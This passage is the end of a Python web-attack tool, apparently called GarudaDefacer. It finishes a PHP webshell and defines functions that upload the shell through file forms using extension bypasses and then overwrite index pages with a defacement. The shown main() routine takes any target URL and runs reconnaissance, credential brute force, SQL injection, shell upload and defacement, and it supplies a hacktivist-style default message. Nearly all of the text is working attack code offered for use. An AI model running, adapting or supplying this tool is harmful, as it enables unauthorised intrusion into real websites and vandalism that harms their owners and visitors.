            $perms = substr(sprintf('%o', fileperms($full)), -4);
            $type = is_dir($full) ? 'DIR ' : 'FILE';
            $writable = is_writable($full) ? 'W' : '-';
            echo "$type $perms $writable $f\\n";
        }
    }
    die();
}

echo "OK";
?>"""

def attempt_shell_upload(upload_form, url):
    """Upload webshell through file upload form"""
    headers = get_headers(url)
    shell_content = generate_webshell()
    
    for filename, content_type in UPLOAD_BYPASS:
        files = {upload_form["file_field"]: (filename, shell_content, content_type)}
        data = dict(upload_form["fields"])
        
        try:
            if upload_form["method"] == "post":
                r = requests.post(upload_form["action"], files=files, data=data, headers=headers, timeout=20)
            else:
                r = requests.put(upload_form["action"], files=files, data=data, headers=headers, timeout=20)
            
            if r.status_code in [200, 201]:
                # Try to find the uploaded shell
                possible_paths = [
                    f"/uploads/{filename}",
                    f"/upload/{filename}",
                    f"/files/{filename}",
                    f"/media/{filename}",
                    f"/images/{filename}",
                    f"/assets/{filename}",
                    f"/uploaded/{filename}",
                    f"/upfiles/{filename}",
                    f"/tmp/{filename}",
                    f"/{filename}",
                    f"/wp-content/uploads/{filename}",
                    f"/admin/uploads/{filename}",
                    f"/{filename}",
                ]
                
                # Also check response for path hints
                if filename.split(".")[0] in r.text:
                    # Try to extract path from response
                    path_match = re.search(r'(?:href|src|path|url|file)["\s:=]+([^"\s<>]+)', r.text, re.IGNORECASE)
                    if path_match:
                        found_path = path_match.group(1)
                        if not found_path.startswith("http"):
                            found_path = urljoin(url, found_path)
                        try:
                            check = requests.get(found_path, headers=headers, timeout=8)
                            if check.status_code == 200 and "OK" in check.text:
                                return True, found_path
                        except:
                            pass
                
                for path in possible_paths:
                    try:
                        shell_url = urljoin(url, path)
                        check = requests.get(shell_url, params={"cmd": "id"}, headers=headers, timeout=8)
                        if check.status_code == 200 and ("uid=" in check.text or "OK" in check.text):
                            return True, shell_url
                    except:
                        continue
        except:
            continue
    
    return False, None

def deploy_deface(shell_url, deface_html, url):
    """Use webshell to deploy deface page"""
    headers = get_headers(url)
    deployed = []
    
    import base64
    
    # First, find writable web root
    try:
        r = requests.post(shell_url, data={"findroot": "1"}, headers=headers, timeout=10)
        roots = r.text.strip().split("\n") if r.text else []
    except:
        roots = WEB_ROOTS
    
    # Add shell's own directory
    try:
        r = requests.post(shell_url, data={"findroot": "1"}, headers=headers, timeout=10)
        for line in r.text.strip().split("\n"):
            if line.startswith("SHELLDIR:"):
                shell_dir = line.replace("SHELLDIR:", "")
                roots.insert(0, shell_dir)
    except:
        pass
    
    # List shell directory first
    try:
        shell_dir = shell_url.rsplit("/", 1)[0]
        r = requests.get(shell_url, params={"list": shell_dir}, headers=headers, timeout=10)
        print_status("*", f"Shell directory listing:", "blue")
        for line in r.text.strip().split("\n")[:10]:
            print(f"      {line}")
    except:
        pass
    
    # Try to write deface page to various locations
    content_b64 = base64.b64encode(deface_html.encode()).decode()
    
    for root in roots:
        for index_file in INDEX_FILES:
            filepath = f"{root}/{index_file}" if root != "." else index_file
            
            try:
                r = requests.post(shell_url, data={
                    "write": "1",
                    "file": filepath,
                    "content": content_b64
                }, headers=headers, timeout=10)
                
                if "OK:" in r.text:
                    print_status("+", f"Defaced: {filepath}", "green")
                    deployed.append(filepath)
                    
                    # Verify
                    verify_url = urljoin(url, f"/{index_file}")
                    if root != "." and root != shell_dir:
                        verify_url = urljoin(url, filepath.replace(root, "").lstrip("/"))
                    
                    try:
                        check = requests.get(verify_url, headers=headers, timeout=8)
                        if check.status_code == 200 and "HACKED" in check.text:
                            print_status("+", f"VERIFIED: {verify_url}", "green")
                            return True, deployed, verify_url
                    except:
                        pass
            except:
                continue
    
    if deployed:
        return True, deployed, urljoin(url, "index.html")
    
    return False, [], None

# ============================================================
# MAIN
# ============================================================

def save_deface_locally(deface_html, filename=None):
    """Save deface page locally"""
    if filename is None:
        filename = f"deface_{int(time.time())}.html"
    
    # Termux: save to storage
    if is_termux():
        storage = os.path.expanduser("~/storage/shared/GarudaDefacer")
        os.makedirs(storage, exist_ok=True)
        filepath = os.path.join(storage, filename)
    else:
        os.makedirs("output", exist_ok=True)
        filepath = os.path.join("output", filename)
    
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(deface_html)
    
    return filepath

def main():
    clear_screen()
    print_banner()
    
    # Check Termux environment
    check_termux_deps()
    print()
    
    # === INPUT ===
    target_url = input("  [>] Target URL (https://target.com): ").strip().strip("/")
    if not target_url:
        print_status("!", "No URL provided. Exiting.", "red")
        return
    if not target_url.startswith("http"):
        target_url = "https://" + target_url
    
    print()
    image_url = input("  [>] Image URL (or Enter to skip): ").strip()
    
    print()
    print("  [>] Deface message (type END on new line to finish):")
    print("  ---")
    message_lines = []
    while True:
        try:
            line = input("  | ")
        except EOFError:
            break
        if line.strip().upper() == "END":
            break
        message_lines.append(line)
    message = "\n".join(message_lines)
    
    if not message:
        message = "Your security has been breached.\nWe are Garuda Security.\nThis is a warning, not a threat.\nFix your vulnerabilities before others exploit them.\n\nWe do not forget. We do not forgive.\nExpect us."
    
    print()
    alias = input("  [>] Your alias (default: Garuda Security): ").strip()
    if not alias:
        alias = "Garuda Security"
    
    print()
    group = input("  [>] Group name (default: Garuda Security): ").strip()
    if not group:
        group = "Garuda Security"
    
    # === GENERATE DEFACE PAGE ===
    print()
    print_status("*", "Generating defacement page...", "blue")
    time.sleep(0.5)
    deface_html = generate_deface_page(image_url, message, alias, group)
    local_path = save_deface_locally(deface_html)
    print_status("+", f"Deface page saved: {local_path}", "green")
    
    # === RECON ===
    print()
    print_status("*", f"Starting reconnaissance on {target_url}", "blue")
    print("  " + "-" * 56)
    
    recon = recon_target(target_url)
    
    if recon["status"]:
        print_status("+", f"Status: {recon['status']}", "green")
    else:
        print_status("-", "Target appears to be down", "red")
        print_status("!", "Cannot continue. Deface page saved locally.", "yellow")
        print()
        print_status("*", "Opening local preview...", "blue")
        open_file(local_path)
        return
    
    print_status("+", f"Server: {recon['server']}", "green")
    if recon["ip"]:
        print_status("+", f"IP Address: {recon['ip']}", "green")
    if recon["title"]:
        print_status("+", f"Title: {recon['title'][:50]}", "green")
    if recon["tech"]:
        print_status("+", f"Technology: {', '.join(recon['tech'])}", "green")
    if recon["cms"]:
        print_status("+", f"CMS: {', '.join(recon['cms'])}", "green")
    
    if recon["robots"]:
        print_status("+", "robots.txt found (may contain hidden paths)", "green")
    
    # === FIND LOGIN FORMS ===
    print()
    print_status("*", "Scanning for login forms...", "blue")
    login_forms = find_login_forms(target_url)
    
    access_gained = False
    shell_uploaded = False
    shell_url = None
    
    if login_forms:
        print_status("+", f"Found {len(login_forms)} login form(s)", "green")
        for i, form in enumerate(login_forms):
            path = form.get("discovered_at", "/")
            print(f"      [{i+1}] {form['action']} (path: {path})")
        
        # === BRUTE FORCE ===
        print()
        print_status("*", "Starting credential brute force...", "blue")
        print("  " + "-" * 56)
        
        for i, form in enumerate(login_forms):
            print_status("*", f"Testing form {i+1}...", "blue")
            success, creds = try_credentials(form, target_url)
            
            if success:
                print_status("+", f"CREDENTIALS FOUND: {creds[0]}:{creds[1]}", "green")
                print_status("+", "ACCESS GAINED!", "green")
                access_gained = True
                print()
                print_status("*", "Now scanning for upload forms in authenticated area...", "blue")
                
                # Try to find upload forms with session
                # (In real scenario, we'd maintain the session)
                upload_forms = find_upload_forms(target_url)
                if upload_forms:
                    print_status("+", f"Found {len(upload_forms)} upload form(s)", "green")
                    shell_uploaded, shell_url = attempt_shell_upload(upload_forms[0], target_url)
                    if shell_uploaded:
                        print_status("+", f"Shell uploaded: {shell_url}", "green")
                break
            
            # === SQL INJECTION ===
            print_status("*", f"Testing SQL injection on form {i+1}...", "blue")
            if try_sqli(form, target_url):
                print_status("+", f"SQL INJECTION SUCCESSFUL!", "green")
                print_status("+", "ACCESS GAINED VIA SQLi!", "green")
                access_gained = True
                
                print()
                print_status("*", "Scanning for upload forms...", "blue")
                upload_forms = find_upload_forms(target_url)
                if upload_forms:
                    shell_uploaded, shell_url = attempt_shell_upload(upload_forms[0], target_url)
                    if shell_uploaded:
                        print_status("+", f"Shell uploaded: {shell_url}", "green")
                break
        
        if not access_gained:
            print_status("-", "All credential and SQLi attempts failed", "yellow")
    else:
        print_status("-", "No login forms found", "yellow")
    
    # === FIND UPLOAD FORMS (even without login) ===
    if not shell_uploaded:
        print()
        print_status("*", "Scanning for file upload vulnerabilities...", "blue")
        upload_forms = find_upload_forms(target_url)
        
        if upload_forms:
            print_status("+", f"Found {len(upload_forms)} upload form(s)", "green")
            for i, form in enumerate(upload_forms):
                path = form.get("discovered_at", "/")
                print(f"      [{i+1}] {form['action']} (path: {path})")
            
            print()
            print_status("*", "Attempting shell upload with extension bypass...", "blue")
            print("  " + "-" * 56)
            
            for form in upload_forms:
                success, s_url = attempt_shell_upload(form, target_url)
                if success:
                    print_status("+", f"Shell uploaded successfully!", "green")
                    print_status("+", f"Shell URL: {s_url}", "green")
                    shell_uploaded = True
                    shell_url = s_url
                    break
            
            if not shell_uploaded:
                print_status("-", "All upload bypass attempts failed", "yellow")
        else:
            print_status("-", "No upload forms found", "yellow")
    
    # === DEPLOY DEFACE PAGE ===
    print()
    print("  " + "=" * 56)
    
    if shell_uploaded and shell_url:
        print_status("*", "Deploying defacement page via webshell...", "blue")
        print("  " + "-" * 56)
        deployed, files, verify_url = deploy_deface(shell_url, deface_html, target_url)
        
        if deployed:
            print()
            print("  " + "=" * 56)
            print_status("+", "DEFACEMENT SUCCESSFUL!", "green")
            print_status("+", f"Target: {target_url}", "green")
            print_status("+", f"Files overwritten: {len(files)}", "green")
            for f in files:
                print(f"      -> {f}")
            if verify_url:
                print_status("+", f"Verify: {verify_url}", "green")
            print("  " + "=" * 56)
        else:
            print_status("-", "Could not write deface page via shell", "yellow")
            print_status("!", "Shell is available but web root not writable", "yellow")
            print_status("!", f"Manual deployment needed. Shell: {shell_url}", "yellow")
            print_status("!", f"Deface page: {local_path}", "yellow")
    else:
        print_status("-", "Automated exploitation failed", "yellow")
        print_status("!", f"Deface page saved: {local_path}", "yellow")
        print_status("!", "Deploy manually after gaining access", "yellow")
        print("  " + "=" * 56)
    
    # === LOCAL PREVIEW ===
    print()
    print_status("*", "Opening local preview...", "blue")
    time.sleep(1)
    open_file(local_path)
    
    print()
    print_status("*", "Operation complete.", "cyan")
    print(f"  {AUTHOR} v{VERSION}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  [!] Interrupted by user. Exiting.\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n  [!] Fatal error: {e}\n")
        sys.exit(1)
